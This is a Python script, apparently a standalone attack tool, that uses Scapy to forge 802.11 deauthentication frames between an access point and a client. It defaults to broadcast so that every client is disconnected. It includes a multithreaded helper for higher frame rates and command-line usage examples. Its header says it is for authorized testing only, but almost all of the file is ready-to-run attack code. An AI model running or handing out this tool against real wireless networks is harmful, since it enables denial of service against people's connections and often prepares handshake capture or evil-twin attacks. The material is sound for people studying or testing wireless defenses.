"""
Deauth.py - A Wi-Fi Deauthentication Attack Tool
=================================================

This script sends 802.11 deauthentication frames to disconnect a station
(client) from an access point (AP). It uses Scapy to craft and send raw
802.11 frames on a monitor-mode capable wireless interface.

WARNING:
    This tool is intended for authorized security testing and educational
    purposes only. Using it against networks you do not own or do not have
    explicit written permission to test is illegal in most jurisdictions.

Usage:
    sudo python ./Deauth.py <iface> <ap> [station] [count] [key=value ...]

Arguments:
    iface       : Wireless interface in monitor mode (e.g., wlan0mon).
    ap          : MAC address of the target access point (BSSID).
    station     : MAC address of the target client. Defaults to broadcast
                  (ff:ff:ff:ff:ff:ff) to deauth all clients.
    count       : Number of deauth frames to send per direction. Default: 1.
    key=value   : Optional Scapy sendp() keyword arguments (e.g., inter=0.1).

Examples:
    # Deauth all clients from an AP
    sudo python ./Deauth.py wlan0mon AA:BB:CC:DD:EE:FF

    # Deauth a specific client 10 times
    sudo python ./Deauth.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 10

    # Send with a 0.05s interval between frames
    sudo python ./Deauth.py wlan0mon AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 5 inter=0.05

Requirements:
    - Python 3
    - Scapy (pip install scapy)
    - Root privileges (raw socket access)
    - A wireless adapter that supports monitor mode and packet injection
"""

from scapy.all import Dot11, Dot11Deauth, sendp, RadioTap
import sys
from threading import Thread


def Deauth(ap, station, count=1, iface="wlan0", **kwargs):
    """
    Send deauthentication frames between an AP and a station.

    Two frames are sent per iteration:
        1. AP -> Station: spoofed as if the AP is kicking the client out.
        2. Station -> AP: spoofed as if the client is leaving the AP.

    Sending both directions increases the chance of a successful disconnect,
    since some clients/APs ignore a single-direction deauth.

    Args:
        ap (str): MAC address of the access point (BSSID).
        station (str): MAC address of the target client, or broadcast.
        count (int): Number of deauth pairs to send. Default is 1.
        iface (str): Wireless interface name. Default is "wlan0".
        **kwargs: Additional keyword arguments passed to Scapy's sendp()
                  (e.g., inter=0.1, loop=0, verbose=0).

    Returns:
        None
    """
    for _ in range(count):
        # Frame 1: Spoofed as coming from the AP, targeting the station.
        AP_TO_STA = (
            RadioTap()
            / Dot11(addr1=station, addr2=ap, addr3=ap)
            / Dot11Deauth(reason=7)
        )

        # Frame 2: Spoofed as coming from the station, targeting the AP.
        STA_TO_AP = (
            RadioTap()
            / Dot11(addr1=ap, addr2=station, addr3=ap)
            / Dot11Deauth(reason=7)
        )

        sendp(AP_TO_STA, iface=iface, verbose=0, **kwargs)
        sendp(STA_TO_AP, iface=iface, verbose=0, **kwargs)


def Dstart(add=10, *args, **kwargs):
    """
    Run Deauth() in multiple threads for higher throughput.

    Note:
        Each thread runs the full 'count' value passed via args/kwargs,
        so the total frames sent equals count * add.

    Args:
        add (int): Number of threads to spawn. Default is 10.
        *args: Positional arguments forwarded to Deauth().
        **kwargs: Keyword arguments forwarded to Deauth().

    Returns:
        None
    """
    threads = []
    for _ in range(add):
        t = Thread(target=Deauth, args=args, kwargs=kwargs)
        t.start()
        threads.append(t)

    # Wait for all threads to finish before returning.
    for t in threads:
        t.join()


def run_py():
    """
    Parse command-line arguments and launch the deauth routine.

    Reads sys.argv, validates input, and calls Deauth() with the
    user-provided parameters. Extra key=value arguments are forwarded
    to Scapy's sendp() as keyword arguments.

    Usage:
        python ./Deauth.py <iface> <ap> [station] [count] [key=value ...]

    Returns:
        None
    """
    argv = sys.argv

    # Require at least the interface and AP MAC.
    if len(argv) < 3:
        print("Usage: python ./Deauth.py <iface> <ap> [station] [count] [key=value ...]")
        sys.exit(1)

    iface = argv[1]
    ap = argv[2]

    # Default station is broadcast (deauth everyone).
    sta = argv[3] if len(argv) >= 4 else "ff:ff:ff:ff:ff:ff"

    # Default count is 1; validate integer input.
    try:
        count = int(argv[4]) if len(argv) >= 5 else 1
    except ValueError:
        print("Error: 'count' must be an integer.")
        sys.exit(1)

    # Collect any extra key=value pairs starting from the 5th argument.
    data = {}
    for item in argv[5:]:
        if "=" in item:
            key, value = item.split("=", 1)
            data[key] = value

    # Execute the deauth attack with parsed parameters.
    Deauth(ap=ap, station=sta, count=count, iface=iface, **data)


if __name__ == "__main__":
    run_py()